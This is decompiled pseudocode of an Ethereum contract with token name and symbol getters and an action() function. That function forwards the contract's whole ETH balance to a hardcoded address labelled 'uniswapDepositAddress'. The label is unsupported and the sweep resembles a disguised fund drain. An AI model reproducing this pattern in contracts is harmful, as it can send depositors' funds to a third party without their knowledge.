contract main {




// =====================  Runtime code  =====================


const uniswapDepositAddress = 0x3708fa7c2afb7ff092909205b271826a3fec403a


array of uint256 tokenName;
array of uint256 tokenSymbol;

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    call 0x3708fa7c2afb7ff092909205b271826a3fec403a with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
